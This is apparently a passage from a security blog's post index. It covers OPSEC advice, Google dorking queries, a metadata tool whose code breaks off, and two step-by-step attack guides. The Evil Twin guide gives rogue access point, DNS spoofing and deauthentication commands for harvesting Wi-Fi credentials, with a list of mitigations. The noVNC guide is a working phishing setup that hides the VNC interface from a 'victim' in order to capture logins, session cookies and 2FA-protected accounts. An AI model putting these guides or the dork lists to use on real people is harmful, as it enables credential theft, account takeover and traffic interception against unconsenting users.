vulnerability scanning feature relies on external APIs and may not cover all possible vulnerabilities.Future Enhancements  Support for IPv6: Add support for scanning IPv6 addresses.  Enhanced OS Fingerprinting: Improve the accuracy of OS fingerprinting by incorporating more advanced techniques.  Integration with More APIs: Integrate with additional vulnerability databases and APIs.  User Interface: Develop a graphical user interface (GUI) for easier interaction.  Automated Reporting: Add support for automated email or Slack notifications with the scan report.  Customizable Port Ranges: Allow users to define and save custom port ranges for scanning.  Performance Optimization: Optimize the code for faster scanning and reduced resource usage.Ethical Considerations  Authorization: Always ensure you have proper authorization before scanning any network or system. Unauthorized scanning can be illegal and unethical.  Data Privacy: Be mindful of the data you collect during scanning. Ensure that any sensitive information is handled securely and in compliance with relevant laws and regulations.  Impact on Target Systems: Be aware that aggressive scanning can impact the performance of target systems. Use the tool responsibly and avoid causing disruption.  Disclosure of Vulnerabilities: If you discover vulnerabilities during your scan, follow responsible disclosure practices to inform the affected parties.Tips and Tricks  Use Top Ports: For a quick scan, use the “Top Ports” option to scan commonly used ports.  Custom Port Ranges: For a more thorough scan, specify a custom port range (e.g., 1-1024).  GeoIP Database: Ensure the GeoIP database is present in the working directory for accurate geolocation.  External APIs: If you have API keys for Shodan or other services, configure them in the code for enhanced vulnerability scanning.  HTML Report: Always review the generated HTML report for a comprehensive summary of the scan results.Extra Insights  Service Banners: The program attempts to grab service banners from open ports. This can provide valuable information about the services running on the target.  Vulnerability Suggestions: The program suggests potential vulnerabilities based on the detected services. Use this information to prioritize further investigation.  Traceroute: The traceroute feature can help you understand the network path to the target, which can be useful for troubleshooting or network analysis.  WHOIS Lookup: The WHOIS lookup feature provides information about the domain registration, which can be useful for identifying the owner of the target.ConclusionThis Python-based network scanner is a tool for network reconnaissance and vulnerability assessment. It provides a wide range of features, from basic port scanning to advanced vulnerability detection and reporting."
  },
  
  {
    "title": "OPSEC",
    "url": "/posts/opsec/",
    "categories": "OPSEC, Anonymity",
    "tags": "Anonymity, Privacy",
    "date": "2025-02-04 11:53:00 +0000",
    





    
    "snippet": "A Tactical Dive into Operations SecurityFinally taking the plunge to share thoughts that have been brewing in the recesses of my mind. So, what’s the scoop? It’s all about the intricate dance of OP...",
    "content": "A Tactical Dive into Operations SecurityFinally taking the plunge to share thoughts that have been brewing in the recesses of my mind. So, what’s the scoop? It’s all about the intricate dance of OPSEC, or OPERATIONS SECURITY. For those who fancy a formal definition, OPSEC is the art of evaluating whether our moves are visible to potential threats, assessing the risk of compromising information, and then taking calculated measures to thwart those who seek to exploit our critical data.The Origins of OPSECDiving into the tactical realm, OPSEC emerged officially in 1966 during the US’s Operation Purple Dragon, spurred by the need to investigate operational mishaps and devise a pre-operation process to dodge fatal compromises.Core PrinciplesIn a nutshell, OPSEC boils down to one thing: control. Control over information and actions, to prevent any attempts at turning them against you. Whether you’re immersed in threat intelligence collection, a red team engagement, or just nosing around an investigation, OPSEC is the guardian angel watching over it all. While the textbooks swear by five sacred steps, we’re zooming in on a couple, starting with the core of Identifying and Analyzing Threats &amp; Vulnerabilities.Picture a process that unveils the adversary’s watchful gaze, details the information they crave, and pinpoints your Achilles’ heels. That’s just the kickoff. We then pivot to Assessing Risks and strategically applying Appropriate Countermeasures. Quick heads-up: I’m spinning this yarn with a big ol’ focus on Anonymity and Privacy.Safeguarding Critical InformationNow, whether you’re a soldier, a civilian, or somewhere in the murky in-between, safeguarding your critical information is non-negotiable. This isn’t just a 9-to-5 deal—it extends to your home. OPSEC isn’t just for the field; it’s your shield against personal info leaks and safeguarding sensitive details from turning into weapons against you. From PII and financial data to your daily grind, address, and personal records, OPSEC’s got your back.Stick around, and we’ll navigate the cyber, hopping between topics, unraveling my train of thought. By the time we wrap this up, it should all click into place.Identifying and Analyzing Threats &amp; VulnerabilitiesAlright, let’s demystify the Identification of Critical Information. In plain speak, it’s about pinpointing what needs safeguarding to pull off the operation without a hitch. Be it your source IP address, the tools of the trade, or the intricate web of your command and control (C&amp;C) infrastructure – make it crystal clear. Enter CALI (Capabilities, Activities, Limitations, and Intentions), a straightforward checklist outlining the operation’s must-haves. But before I dive into the deep end and potentially befuddle you, let’s ease into it with a high-level overview and a dash of shenanigans.Internet Privacy: IP AddressLet’s get down to the internet. IP – the gateway to the online realm. Your connection to the internet is marked by an IP provided by your trusty ISP (Internet Service Provider), a key linked to an entry in their database. Most countries, ever-vigilant, have data retention regulations, forcing ISPs to log who’s using what IP when, for years on end. If that origin IP leaks, it’s a breadcrumb trail straight to you.DNS (Domain Name System)Now, DNS. Standing for “Domain Name System,” it’s the wizard behind the curtain, helping your browser find the IP address of a service. Think of it as a colossal contact list – ask for a name, and it hands you the number. When your browser wants to visit, say, github via github.com, it ping-pongs with a DNS service to unveil the IP addresses of github’s servers.Typically, your ISP dishes out the DNS service, automatically set up by the network you’re on. So, you type github.com into your browser, and the request embarks on an internet journey, hopping from DNS resolver to root nameserver to TLD server, and finally, to the domain’s nameserver. All this dance reveals the IP address of github.com, which then travels back to your browser, completing the ritual.For a deeper dive, check out: What is DNS?But here’s the kicker – most of these DNS requests cruise unencrypted. Even if you’re surfing in incognito mode or HTTPS, your browser might be casually throwing unencrypted DNS requests out there, saying, “Hey, what’s the IP address of www.cloudflare.com”. Not exactly covert, right?Fortifying Your Privacy with Encrypted DNSNow that we’ve paved the way and you’ve got the basics down, let’s talk about fortifying your privacy. Enter encrypted DNS (DNS over HTTPS or DNS over TLS). You can set up your private DNS server, self-hosted with something like pi-hole or remotely hosted with services like nextdns or 1.1.1.1 within the Tor network. Sounds like airtight privacy, right? Well, not entirely.You can’t don the cloak of Tor all the time – it’s like shouting, “Hey, look at me!” and that’s not our game plan. To dodge unnecessary attention, we introduce VPNs and Tor, tag-teaming to keep your ISP and any nosy third party from eavesdropping or blocking your DNS requests. We’ll unpack this intricate dance in more detail down the road.MAC Address Randomization &amp; TrackingWe’ve got a glaring gap to address here – MAC addresses, a pivotal piece of the puzzle. Your MAC address, acting as a unique ID for your network interface, can become a tracking beacon if left unrandomized. Big players like Microsoft and Apple, along with device manufacturers, maintain logs with MAC addresses, creating a traceable trail linking devices to specific accounts.Even if you think you’ve slipped under the radar by buying your gadget “anonymously,” surveillance tactics, from CCTV footage to mobile provider antenna logs, might expose your identity. So, randomizing your MAC becomes a non-negotiable move. Concealing both your MAC and Bluetooth addresses is paramount.Threat Analysis: Understanding Your AdversaryNow, let’s unpack Threat Analysis in layman’s terms. It’s all about getting to know your adversaries inside out and identifying what’s on the line. Picture this: the threat of your source IP, network, or fingerprint being exposed. This becomes especially critical when dealing with malware samples – slip up, and your investigation might be blown.For those donning the hat of adversary hunters, safeguarding your identity as a researcher is paramount. Some adversaries aren’t above trying to infect or exploit researchers with malware. Let’s break it down step by step:  Main OS: Used for normal work, research, browsing, and keeping things clean.  Private VM: For malware analysis, encrypted traffic routing.  Hidden OS: A VM within a VM, routed through Tor for complete anonymity.This multi-layered approach significantly slashes the odds of your adversaries easily de-anonymizing you.Whonix: A Linchpin for AnonymizationEnter Whonix, a linchpin in the anonymization process. Whonix, a Linux distribution, rolls out two Virtual Machines:  Whonix Workstation: Your go-to for anonymous activities.  Whonix Gateway: Establishing a connection to the Tor network and routing all network traffic from the Workstation through the Tor network.You’ve got two routes here:  Whonix-only route, where all traffic journeys through the Tor Network.  Whonix hybrid route, where everything goes through a cash-paid VPN over the Tor Network.Choose your adventure wisely.Vulnerability Analysis &amp; Risk AssessmentNow, let’s delve into identifying vulnerabilities – the weak spots adversaries are itching to exploit. The Tor Project, while a formidable force, isn’t an impervious fortress against global adversaries. Successful attacks have left their mark, and advanced techniques boasting a remarkable 96% success rate in fingerprinting encrypted traffic have emerged over the years, exposing the websites you’ve visited.Consider major platforms like Twitter and Facebook. The anonymity offered by Tor starts losing its mojo when users toss in their real names, pictures, and link their accounts to personal info like emails and phone numbers. Platforms can employ algorithms to scrutinize browsing patterns, potentially connecting you to other profiles.Securing DevicesDon’t forget to disable Bluetooth, biometrics, webcam, and microphone. Enable BIOS/UEFI password, and disable USB/HDMI. These measures help keep things in check and fend off certain attacks. And whatever you do, don’t leave your laptop unattended in your hotel room or elsewhere. Make it as challenging as possible for anyone to tamper with it without raising alarms.Conclusion: OPSEC as a StrategyI won’t sugarcoat it – achieving perfect OPSEC is an illusion. Compromises are inevitable. The key is in your dedication and the measures you’re willing to take. The more time invested and the more cautious you are, the better.Remember the basics: avoid attracting attention, stay vigilant, be patient, steer clear of laziness and ignorance, blend in, do what makes sense, and, most importantly, Sh*t up.Final ThoughtsI’ve touched on the shenanigans in play. While not an exhaustive dive into every facet of attacks or vulnerabilities, consider this a 101 to kickstart your research. It’s designed to stake a claim in the recesses of your mind, offering a glimpse into how an OPSEC strategy should take shape.And no matter what research you conduct or guide/tips you come across might not cut it; they could be downright irrelevant to your unique operations.So, how do you make this realistically work? Simple. Build your own OPSEC and execute drills that fit your OP. It shouldn’t consume more than a few hours in most cases. Stay sharp, stay secure."
  },
  
  {
    "title": "Evil Twin Attack",
    "url": "/posts/Evil-Twin-Attack/",
    "categories": "Exploits, Evil Twin Attack",
    "tags": "Exploits, Evil Twin Attack",
    "date": "2025-02-01 13:40:00 +0000",
    





    
    "snippet": "Evil Twin Attack: Exploiting Wi-Fi Clients Without Additional HardwareIntroductionThe Evil Twin Attack is a sophisticated method of exploiting Wi-Fi clients by creating a rogue access point (AP) th...",
    "content": "Evil Twin Attack: Exploiting Wi-Fi Clients Without Additional HardwareIntroductionThe Evil Twin Attack is a sophisticated method of exploiting Wi-Fi clients by creating a rogue access point (AP) that mimics a legitimate one. The goal is to force clients to disconnect from the legitimate network and reconnect to the malicious AP, which has the same SSID. Once connected, the attacker can intercept traffic, redirect users to a fake firmware upgrade page, and harvest credentials or other sensitive information.This attack can be executed using a Debian-based OS like Kali Linux without the need for additional hardware (though an external NIC may improve performance). Below is a step-by-step guide to setting up the attack, followed by mitigation strategies to defend against such exploits.Attack Overview  Objective:          Knock Wi-Fi clients off their legitimate network.      Force them to reconnect to a rogue AP with the same SSID.      Redirect traffic to a fake firmware upgrade portal to harvest credentials.        Tools:          hostapd: For creating the rogue AP.      dnsmasq: For DHCP and DNS spoofing.      apache2/nginx: For hosting the fake portal.      iptables: For traffic redirection.      aireplay-ng: For deauthentication attacks.        Prerequisites:          A wireless interface in monitor mode.      Basic knowledge of networking, social engineering, and web development.      Step-by-Step Execution1. Install Required Toolssudo apt install hostapd dnsmasq apache22. Set Wireless Interface to Monitor Modeiwconfig [iface] mode monitor3. Create Working Directorymkdir evil-twin &amp;&amp; cd evil-twin4. Configure hostapdCreate hostapd.conf:vim hostapd.confConfiguration:interface = [iface]driver = nl80211ssid = [ESSID of target]hw_mode = gchannel = [channel of target]macaddr_acl = 0ignore_broadcast_ssid = 05. Configure dnsmasqCreate dnsmasq.conf:vim dnsmasq.confConfiguration:interface = [iface]dhcp-range = 192.168.1.2, 192.168.1.30, 255.255.255.0, 12hdhcp-option=3, 192.168.1.1dhcp-option=6, 192.168.1.1server = 8.8.8.8log-querieslog-dhcplisten-address=127.0.0.16. Configure Network Interfaceifconfig [iface] up 192.168.1.1 netmask 255.255.255.07. Add Routing Rulesroute add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.18. Set Up IP Tables for Traffic Redirectioniptables --table nat --append PREROUTING -i [iface] -p tcp -j REDIRECT --to-ports &lt;ports running your portal&gt;9. Set Up the Fake Portal  Use tools like httrack to clone a legitimate firmware upgrade page.  Modify the HTML/CSS to make it convincing.  Set up a backend (e.g., Flask, Node.js) to handle user input.  Save credentials to a database or file.10. Start Serviceshostapd hostapd.confdnsmasq -C dnsmasq.conf -ddnsspoof -i [iface]11. Launch Deauthentication Attackaireplay-ng --deauth 0 -a [victim's BSSID] [iface]Mitigation Strategies1. Use Strong Encryption  Ensure your Wi-Fi network uses WPA3 encryption. If WPA3 is unavailable, use WPA2 with a strong passphrase.2. Monitor for Rogue APs  Deploy wireless intrusion detection systems (WIDS) to detect and alert on rogue APs.3. Implement Certificate-Based Authentication  Use 802.1X/EAP to authenticate devices connecting to your network. This prevents unauthorized devices from joining, even if they have the correct SSID and password.4. Educate Users  Train users to recognize suspicious activity, such as unexpected firmware upgrade prompts or certificate warnings.5. Disable Auto-Reconnect  Configure devices to not auto-reconnect to known networks without user confirmation.6. Regularly Update Firmware  Ensure all network devices are running the latest firmware to patch known vulnerabilities.7. Segment Your Network  Use VLANs to isolate sensitive devices and services from the rest of the network.8. Monitor Network Traffic  Use tools like Wireshark or Zeek to analyze network traffic for anomalies.9. Enable HTTPS Everywhere  Ensure all web-based services use HTTPS to prevent traffic interception.10. Deploy Honeypots  Set up honeypot APs to detect and analyze malicious activity."
  },
  
  {
    "title": "Exploiting noVNC for 2FA Bypass",
    "url": "/posts/Exploiting-noVNC-for-2FA-Bypass/",
    "categories": "Exploits, noVNC",
    "tags": "Exploits, noVNC, 2FA Bypass",
    "date": "2025-01-29 00:00:00 +0000",
    





    
    "snippet": "Using noVNC for Credential Acquisition and Bypassing 2FAnoVNC is both a JavaScript library for VNC clients and an application built on top of this library. Compatible with any modern browser, inclu...",
    "content": "Using noVNC for Credential Acquisition and Bypassing 2FAnoVNC is both a JavaScript library for VNC clients and an application built on top of this library. Compatible with any modern browser, including mobile versions for iOS and Android, noVNC allows the web browser to function as a VNC client, enabling remote access to a machine.So, how can we use noVNC to acquire credentials and bypass 2FA? Here’s the process:  Set up a server with noVNC.  Start Chromium (or any other browser) in Kiosk mode.  Direct it to the desired website for user authentication (e.g., accounts.google.com).  Send the link to the target user. When they click the URL, they will access the VNC session without realizing it.  Since Chromium is configured in Kiosk mode, the user experience will appear as a normal web page.Exploitation PossibilitiesThe exploitation possibilities of this method are vast:  Inject JS into the browser.  Use an HTTP proxy connected to the browser to log all activities.  Terminate the VNC session after user authentication.  Capture the browser session token (Right-click &gt; Inspect &gt; Application &gt; Cookies) after the user disconnects.  Run a background keylogger.  Or get creative and find other approaches (remember, the server is yours).noVNC Setup and Demonstration1. Deploy a Kali Linux InstanceUse any cloud service provider or deploy locally to set up a Linux machine. I will use Kali Linux for this demonstration because I prefer it, but you can choose any other Linux distribution you are comfortable with.2. Install TigerVNCFirst, you need to install VNC software. I tested two options: X11vnc and TigerVNC. After several tests, I chose to use TigerVNC.sudo apt updatesudo apt install tigervnc-standalone-server tigervnc-xorg-extension tigervnc-viewer3. Set Up a VNC PasswordvncpasswdOn Kali Linux, I didn’t need to create the xstartup file, but if you encounter any errors, you can configure it manually.nano ~/.vnc/xstartupPaste or write the following:#!/bin/shxrdb \"$HOME/.Xresources\"xsetroot -solid greyx-terminal-emulator -geometry 80x24+10+10 -ls -title \"$VNCDESKTOP Desktop\" &amp;x-window-manager &amp;# Fix to make GNOME workexport XKL_XMODMAP_DISABLE=1/etc/X11/XsessionAdd execution permissions:chmod +x ~/.vnc/xstartup4. Restart the VNC ServerRestart the VNC server, choosing the screen size settings according to your needs. noVNC automatically adjusts to the browser’s screen size, but do your own testing.vncserver -depth 32 -geometry 1920x10805. Download and Run noVNCgit clone https://github.com/novnc/noVNC.gitORapt install novncNow run noVNC locally or publicly. Here are the commands:  Check the VNC server port:vncserver -listExample: 5901, 5902, 5903, etc.  Run noVNC:./noVNC/utils/novnc_proxy --vnc localhost:5901  Set up an SSH tunnel:ssh -L 6080:127.0.0.1:6080 root@server  Run publicly using port 8081:ufw allow http./noVNC/utils/novnc_proxy --vnc 0.0.0.0:5901 --listen 80816. Access VNC and Run the Browser in Kiosk ModeAccess your VNC and run the browser in Kiosk mode. I used Chromium, but you can use whatever suits your needs.chromium --no-sandbox --app=https://gmail.com --kiosk7. Send the URL to the “Victim” to Connect Automaticallyhttp://127.0.0.1:6080/vnc.html?autoconnect=true&amp;password=YOUR-PASSWORDThe autoconnect=true&amp;password=VNCPASSWORD will make the user authenticate automatically. If you want to rename the query parameter, you can modify the vnc.html file.8. Modify the CSS to Remove Visual ElementsnoVNC displays a custom loading page, a VNC control bar, and some additional unnecessary visual elements that should be removed.Open vnc.html, find the divs below, and add the CSS style shown.&lt;!-- Hide unnecessary items --&gt;&lt;div id=\"noVNC_control_bar_anchor\" class=\"noVNC_vcenter\" style=\"display:none;\"&gt;&lt;div id=\"noVNC_status\" style=\"display:none\"&gt;&lt;/div&gt;&lt;!-- Makes the loading page white --&gt;&lt;div id=\"noVNC_transition\" style=\"background-color:white;color:white\"&gt;Important Notes  You are giving remote access to your machine! It should not have anything valuable stored on it.  Any logged data should likely be sent to a remote machine.  Do not use the root account. Set up a restricted user account that uses the VNC service.  Configure the Kiosk mode more restrictively."
  },
  
  {
    "title": "Mastering Google Dorking: The Ultimate Guide",
    "url": "/master-google-dorking-ultimate-guide",
    "categories": "OSINT, Google Dorking",
    "tags": "Google Dorking, Advanced Search",
    "date": "2025-01-28 00:00:00 +0000",
    





    
    "snippet": "Mastering Google Dorking: The Ultimate GuideGoogle Dorking, also known as Google Hacking, is a technique used to uncover sensitive information exposed on the internet. This guide covers everything ...",
    "content": "Mastering Google Dorking: The Ultimate GuideGoogle Dorking, also known as Google Hacking, is a technique used to uncover sensitive information exposed on the internet. This guide covers everything from the basics to advanced techniques, including automation, OSINT gathering, vulnerability exploitation, and ethical considerations. Whether you’re a beginner or an experienced cybersecurity professional, this guide will help you master Google Dorking.Table of Contents  Introduction to Google Dorking  Fundamentals of Google Dorking  Understanding Google Dork Operators  Common Google Dork Queries  Advanced Techniques          Advanced Query Crafting      Exploiting Specific Vulnerabilities      Using Google Dorking for OSINT      Automation and Scripting        Case Studies  Preventing Google Dorking  Google Dorking Tools and Resources  Legal Considerations  ConclusionIntroduction to Google DorkingGoogle Dorking is a technique used to find sensitive information accidentally exposed on the internet. This can include:  Log files with usernames and passwords  Exposed cameras and IoT devices  Sensitive documents (e.g., financial records, confidential files)  Website vulnerabilities (e.g., SQL injection points)While Google Dorking is a powerful tool for information gathering, it is often misused for malicious purposes such as cyberattacks, identity theft, and digital espionage. This guide emphasizes ethical use and encourages readers to use these techniques for security testing and vulnerability assessment.Fundamentals of Google DorkingGoogle Dorking relies on advanced search operators to refine search results. These operators allow you to target specific types of information. Below are the seven fundamental types of queries used in Google Dorking:  intitle: Searches for pages with specific text in their HTML title.          Example: intitle:\"login page\"        allintitle: Similar to intitle, but requires all keywords to be in the title.          Example: allintitle:\"login page admin\"        inurl: Searches for pages based on text in the URL.          Example: inurl:login.php        allinurl: Similar to inurl, but requires all keywords to be in the URL.          Example: allinurl:admin login        filetype: Filters results by specific file types.          Example: filetype:pdf        ext: Filters results by file extensions.          Example: ext:log        site: Limits search results to a specific website.          Example: site:example.com      Understanding Google Dork OperatorsGoogle Dork operators are the building blocks of effective queries. Here’s a breakdown of the most commonly used operators:            Operator      Description      Example                  intitle      Searches for pages with specific text in the title.      intitle:\"login page\"              allintitle      Searches for pages with all specified keywords in the title.      allintitle:\"admin login\"              inurl      Searches for pages with specific text in the URL.      inurl:admin              allinurl      Searches for pages with all specified keywords in the URL.      allinurl:admin login              filetype      Filters results by specific file types.      filetype:pdf              ext      Filters results by file extensions.      ext:log              intext      Searches for pages containing specific text in the body.      intext:\"username\"              allintext      Searches for pages containing all specified keywords in the body.      allintext:\"username password\"              site      Limits search results to a specific domain.      site:example.com              cache      Displays the cached version of a page.      cache:example.com      Common Google Dork QueriesBelow are some commonly used Google Dork queries for various purposes:General Dorksintitle:\"Index of\"intitle:\"Index of\" site:example.comfiletype:log inurl:\"access.log\"intext:\"Welcome to phpMyAdmin\"intitle:\"Login — WordPress\"intext:\"Powered by WordPress\"Database-Related Dorksinurl:/phpmyadmin/index.phpinurl:/db/websql/inurl:/phpPgAdmin/index.phpintext:\"phpPgAdmin — Login\"Search for Vulnerabilitiesintext:\"Error Message\" intext:\"MySQL server\" intext:\"on * using password:\"intext:\"Warning: mysql_connect()\" intext:\"on line\" filetype:phpExposed Documents and Filesfiletype:pdf intitle:\"Confidential\"filetype:doc intitle:\"Confidential\"filetype:xls intitle:\"Confidential\"filetype:ppt intitle:\"Confidential\"Directory Listingsintitle:\"Index of\" inurl:/parent-directoryintitle:\"Index of\" inurl:/admin*intitle:\"Index of\" inurl:/backupintitle:\"Index of\" inurl:/configintitle:\"Index of\" inurl:/logsExposed Webcams and Camerasinurl:\"view/index.shtml\"intitle:\"Live View /-AXIS\"intitle:\"Network Camera NetworkCamera\"Authentication-Related Dorksintitle:\"Login\" inurl:/adminintitle:\"Login\" inurl:/logininurl:\"/admin/login.php\"Exposed Control Panelsintitle:\"Control Panel\" inurl:/adminintitle:\"Control Panel\" inurl:/cpanelExposed IoT Devicesintitle:\"Smart TV\" inurl:/cgi-bin/loginintitle:\"Router Login\" inurl:/loginFinding PHP Info Pagesintitle:\"PHP Version\" intext:\"PHP Version\"Exposing Sensitive Files on Government Sitessite:gov (inurl:doc | inurl:pdf | inurl:xls | inurl:ppt | inurl:rtf | inurl:ps)Exposed Network Devicesintitle:\"Brother\" intext:\"View Configuration\"intitle:\"Network Print Server\" filetype:htmlintitle:\"HP LaserJet\" inurl:SSI/index.htmFile Upload Vulnerabilitiesinurl:/uploadfile/ filetype:phpintext:\"File Upload\" inurl:/php/Advanced TechniquesAdvanced Query CraftingCombine multiple operators for precise searches. Use parentheses () to group conditions and logical operators (OR, AND, -) to refine results.Example:site:example.com (intitle:\"login\" OR inurl:\"admin\") filetype:phpExploiting Specific Vulnerabilities  SQL Injection: inurl:index.php?id=  XSS Vulnerabilities: inurl:search.php?q=  File Inclusion Vulnerabilities: inurl:index.php?page=Using Google Dorking for OSINT  Gathering Information: site:linkedin.com intitle:\"John Doe\"  Finding Leaked Credentials: filetype:txt \"username\" \"password\"Automation and ScriptingAutomate Google Dorking using Python and the requests library.Example Script:import requestsdef google_dork(query):    url = f\"https://www.google.com/search?q={query}\"    headers = {\"User-Agent\": \"Mozilla/5.0\"}    response = requests.get(url, headers=headers)    return response.textquery = 'inurl:index.php?id='results = google_dork(query)print(results)Case StudiesReal-World Example 1: Finding Exposed Admin PanelsA penetration tester used the following query to find exposed admin panels:intitle:\"Admin Login\" inurl:/adminReal-World Example 2: Exploiting SQL InjectionA bug bounty hunter used the following query to find SQL injection vulnerabilities:inurl:index.php?id=Preventing Google DorkingTo protect your website from Google Dorking:  IP-based Restrictions: Limit access to sensitive areas.  Vulnerability Scans: Regularly scan for vulnerabilities.  Google Search Console: Remove sensitive content from search results.  robots.txt: Use this file to block search engines from indexing sensitive directories.  Secure Passwords: Change default passwords on devices and systems.  Disable Remote Logins: Prevent unauthorized access to network devices.Google Dorking Tools and ResourcesHere are some tools and resources to help you get started:  DorkSearch: https://dorksearch.com  Dorks Builder: https://dorks.faisalahmed.me  Google Hacking Database (GHDB): https://www.exploit-db.com/google-hacking-database  Google Operators Guide: https://support.google.com/vault/answer/2474474Legal ConsiderationsUnderstanding Legal BoundariesGoogle Dorking can be a legal gray area. Ensure you have explicit permission before testing any website. Unauthorized access to systems is illegal and punishable by law.ConclusionGoogle Dorking is an invaluable skill for cybersecurity professionals, but it must be used responsibly. By mastering advanced techniques, automating queries, and understanding legal boundaries, you can leverage Google Dorking to enhance security and uncover vulnerabilities. Always prioritize ethical use and obtain proper authorization before performing any tests."
  },
  
  {
    "title": "Metadata Finder",
    "url": "/posts/python-metadata-finder",
    "categories": "Python, Metadata Finder",
    "tags": "Python, Metadata Finder",
    "date": "2025-01-26 00:00:00 +0000",
    





    
    "snippet": "A tool for finding, managing, and removing metadata from images.Features  Metadata Extraction: Extracts detailed metadata such as EXIF data, GPS coordinates, file size, checksum, and more.  Image P...",
    "content": "A tool for finding, managing, and removing metadata from images.Features  Metadata Extraction: Extracts detailed metadata such as EXIF data, GPS coordinates, file size, checksum, and more.  Image Preview: Displays a preview of the uploaded image.  Metadata Removal: Removes all metadata from the image and saves it as a new file.  Metadata Saving: Saves extracted metadata in either .txt or .json format.  User-Friendly GUI: Built with a dark theme for an intuitive user experience.  Progress Indicator: Provides real-time feedback during metadata extraction and removal processes.How It Works  Upload an Image: Use the “Upload Image” button to select an image file (supported formats: JPG, JPEG, PNG, GIF, BMP).  Check Metadata: Click the “Check Metadata” button to extract and display the metadata of the uploaded image.  Remove Metadata: Click the “Remove Metadata” button to strip all metadata from the image and save it as a new file.  Save Metadata: Save the extracted metadata to a file using the “Save Metadata” button.Full CodeGithub Repository:  Metadata Finderimport osimport jsonimport exifreadimport hashlibimport tkinter as tkfrom tkinter import filedialog, messagebox, scrolledtext, ttkfrom PIL import Image, ImageTkclass MetaDataFinderGUI:    def __init__(self, root):        self.root = root        self.root.title(\"MetaDataFinder\")        self.root.geometry(\"1000x800\")        self.root.minsize(1000, 800)        self.image_path = None        self.metadata = {}        self.theme = \"light\"        self.set_theme()        self.create_ui()    def set_theme(self):        if self.theme == \"light\":            self.bg_color = \"#FFFFFF\"            self.fg_color = \"#000000\"            self.button_bg = \"#F0F0F0\"            self.button_fg = \"#000000\"            self.text_area_bg = \"#FAFAFA\"            self.text_area_fg = \"#000000\"        self.root.configure(bg=self.bg_color)    def create_ui(self):        # Title Label        title_label = tk.Label(            self.root,            text=\"MetaDataFinder\",            font=(\"Arial\", 24, \"bold\"),            bg=self.bg_color,            fg=self.fg_color,            padx=10,            pady=10        )        title_label.pack(fill=\"x\")        # File Upload Button        upload_button = tk.Button(            self.root,            text=\"Upload Image\",            command=self.upload_image,            font=(\"Arial\", 12),            bg=self.button_bg,            fg=self.button_fg,            padx=10,            pady=5        )        upload_button.pack(pady=10)        # Image Preview Frame        self.image_preview_frame = tk.Frame(self.root, bg=self.bg_color)        self.image_preview_frame.pack(pady=10)        self.image_label = tk.Label(self.image_preview_frame, bg=self.bg_color)        self.image_label.pack()        # Metadata Display Area        self.metadata_display = scrolledtext.ScrolledText(            self.root,            wrap=tk.WORD,            width=80,            height=15,            font=(\"Arial\", 10),            bg=self.text_area_bg,            fg=self.text_area_fg,            insertbackground=self.fg_color        )        self.metadata_display.pack(pady=10)        self.metadata_display.config(state=\"disabled\")        # Action Buttons Frame        buttons_frame = tk.Frame(self.root, bg=self.bg_color)        buttons_frame.pack(pady=10)        # Check Metadata Button        check_button = tk.Button(            buttons_frame,            text=\"Check Metadata\",            command=self.check_metadata,            font=(\"Arial\", 12),            bg=self.button_bg,            fg=self.button_fg,            padx=10,            pady=5        )        check_button.grid(row=0, column=0, padx=10)        # Remove Metadata Button        remove_button = tk.Button(            buttons_frame,            text=\"Remove Metadata\",            command=self.remove_metadata,            font=(\"Arial\", 12),            bg=self.button_bg,            fg=self.button_fg,            padx=10,            pady=5        )        remove_button.grid(row=0, column=1, padx=10)        # Save Metadata Button        save_button = tk.Button(            buttons_frame,            text=\"Save Metadata\",            command=self.save_metadata,            font=(\"Arial\", 12),            bg=self.button_bg,            fg=self.button_fg,            padx=10,            pady=5        )        save_button.grid(row=0, column=2, padx=10)        # Progress Bar        self.progress = ttk.Progressbar(self.root, orient=\"horizontal\", length=300, mode=\"indeterminate\")        self.progress.pack(pady=10)    def upload_image(self):        self.image_path = filedialog.askopenfilename(            title=\"Select an Image\",            filetypes=[(\"Image Files\", \"*.jpg *.jpeg *.png *.gif *.bmp\")]        )        if self.image_path:            self.display_image()        else:            messagebox.showwarning(\"Warning\", \"No image selected.\")    def display_image(self):        try:            img = Image.open(self.image_path)            img = img.resize((300, 300), Image.Resampling.LANCZOS)  # Use Resampling.LANCZOS for resizing            img_tk = ImageTk.PhotoImage(img)            self.image_label.config(image=img_tk)            self.image_label.image = img_tk        except Exception as e:            messagebox.showerror(\"Error\", f\"Failed to load image: {str(e)}\")    def check_metadata(self):        if not self.image_path:            messagebox.showwarning(\"Warning\", \"Please upload an image first.\")            return        try:            self.progress.start()            self.metadata = self.extract_metadata()            self.display_metadata()            self.progress.stop()        except Exception as e:            messagebox.showerror(\"Error\", f\"Failed to read metadata: {str(e)}\")            self.progress.stop()    def extract_metadata(self):        metadata = {}        # EXIF Data        try:            with open(self.image_path, 'rb') as image_file:                tags = exifread.process_file(image_file)                metadata['Date and Time'] = str(tags.get('EXIF DateTimeOriginal', 'Not Available'))                metadata['Camera Model'] = str(tags.get('Image Model', 'Not Available'))                metadata['Device Name'] = str(tags.get('Image Make', 'Not Available'))                metadata['Software'] = str(tags.get('Image Software', 'Not Available'))                metadata['GPS Coordinates'] = self.get_gps_coordinates(tags)        except Exception:            metadata['EXIF Data'] = \"No EXIF data found\"        # Additional Metadata Fields        metadata['Checksum'] = self.calculate_checksum(self.image_path)        metadata['File Name'] = os.path.basename(self.image_path)        metadata['File Size'] = os.path.getsize(self.image_path)        with Image.open(self.image_path) as img:            metadata['File Type'] = img.format            metadata['File Type Extension'] = os.path.splitext(self.image_path)[1].lower()            metadata['MIME Type'] = Image.MIME[img.format]            metadata['Image Width'] = img.width            metadata['Image Height'] = img.height            metadata['Bit Depth'] = getattr(img.info, 'bit', 'Not Available')            metadata['Color Type'] = img.mode            metadata['RGB'] = \"Yes\" if img.mode == \"RGB\" else \"No\"            metadata['Compression'] = img.info.get(\"compression\", \"Not Available\")            metadata['Filter'] = img.info.get(\"filter\", \"Not Available\")            metadata['Interlace'] = \"Noninterlaced\" if img.info.get(\"interlace\") == 0 else \"Interlaced\"            metadata['Image Size'] = f\"{img.width}x{img.height}\"            metadata['Megapixels'] = round((img.width * img.height) / 1e6, 2)            metadata['Category'] = \"Image\"        return metadata    def calculate_checksum(self, file_path):        hasher = hashlib.md5()        with open(file_path, 'rb') as f:            buf = f.read()            hasher.update(buf)        return hasher.hexdigest()    def get_gps_coordinates(self, exif_data):        if 'GPS GPSLatitude' in exif_data and 'GPS GPSLongitude' in exif_data:            lat = self.convert_to_degrees(exif_data['GPS GPSLatitude'].values)            lon = self.convert_to_degrees(exif_data['GPS GPSLongitude'].values)            if exif_data['GPS 